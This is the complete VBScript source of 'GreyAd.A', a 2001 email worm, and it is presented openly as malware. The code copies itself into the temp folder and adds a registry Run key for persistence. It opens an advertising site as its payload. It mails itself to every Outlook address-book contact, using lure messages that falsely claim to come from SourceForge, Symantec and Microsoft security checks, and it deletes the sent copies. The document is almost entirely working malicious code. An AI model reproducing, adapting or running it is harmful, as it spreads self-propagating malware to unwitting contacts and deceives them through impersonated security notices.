' Virus		: GreyAd
' Strain	: A
' Type		: VBS worm
' Author	: Anax
' Time/Date	: 16:45 2001-06-15
' Comment	: The first strain of the GreyAd worm. The name comes from the grey advertisement
'		  the worm does for HACK.gr
' Note 00:40 2001-06-16 Script made a little bit more dynamic.

Dim Subject(5), Body(5)
Randomize
' Random subject and body lines. More could be added, but you should change the number by which
' RandomNumber is Mod'ed to be equal to the length of the arrays (here: 6).
Subject(0) = "SourceForge verification"
Subject(1) = "Listar command results: help"
Subject(2) = "OpenSource movement on decay?"
Subject(3) = "WinXP going OpenSource?!?!?!"
Subject(4) = "Microsoft Office 97/2000/XP security check"
Subject(5) = "Hahaha virus warning"
Body(0) = "To verify your SourceForge account execute the attached URL link file. If you do not verify and automatically activate the account within 24 hours, it will be deleted. For more information, visit sourceforge.net."
Body(1) = "Listar at Multimedia Computing: Command 'help' results: The results for the requested command are stored in the attached help file."
Body(2) = "Is the OpenSource movement on decay? Worldwide, more and more OS-related sites close down, more and more sponsors stop supporting OS projects, more and more OS authors make their code propertiary. Moreover, the OS movement is targeted from commercial giants like Microsoft. Read the attached article to learn more about the future of the OpenSource movement."
Body(3) = "newsforge.net article attached. Read it promptly. Probably the NC is going to become true, and MS is probably makng XP OS!!!"
Body(4) = "The attached executable file checks your computer for possible vulnerability introduced in Office 97 and maintained in 2000 and XP."&VBCrLf&VbCrLf"Symantec Antivirus Software"&VBCrLf&"For more information visit http://www.symantec.com/"
Body(5) = "The attached file is an article from NAV's site regarding the Hahaha virus. Read it carefully. If you have experienced any of the problems presented there, contact Symantec, at http://www.symantec.com/"

Set FSO = CreateObject("Scripting.FileSystemObject")
TempDir = FSO.GetSpecialFolder(2)
VirusName = TempDir & "\VBS.GreyAd.A.vbs"
Set WSShell = CreateObject("WScript.Shell")
WSShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GreyAd", "wscript.exe " & VirusName & " %"
FSO.CopyFile WScript.ScriptFullName, VirusName
Payload
If WSShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VBS.GreyAd.A\L9K6D352") <> 1 Then
Spread
End If
Function Spread()
Set OLApp = CreateObject("Outlook.Application")
If OLApp = "Outlook" Then
Set MAPINS = OLApp.GetNameSpace("MAPI")
Set AddressLists = MAPINS.AddressLists
For Each List In AddressLists
RandomNumber = (Rnd + 314) Mod 6
If List.AddressEntries.Count <> 0 Then
Count = List.AddressEntries.Count
For Counter = 1 To Count
Set OLAppItem = OLApp.CreateItem(0)
Set AddressEntries= List.AddressEntries(Counter)
OLAppItem.To = AddressEntries.Address
OLAppItem.Subject = Subject(RandomNumber)
OLAppItem.Body = Body(RandomNumber)
Set Attachments = OLAppItem.Attachments
Attachment = VirusName
OLAppItem.DeleteAfterSubmit = True
Attachments.Add Attachment
If OLAppItem.To <> "" Then
OLAppItem.Send
End If
Next
End If
Next
End If
End function

Function Payload()
WSShell.Run "http://www.hack.gr/users/navigator/",false
End Function
' End of Virus (aparently)
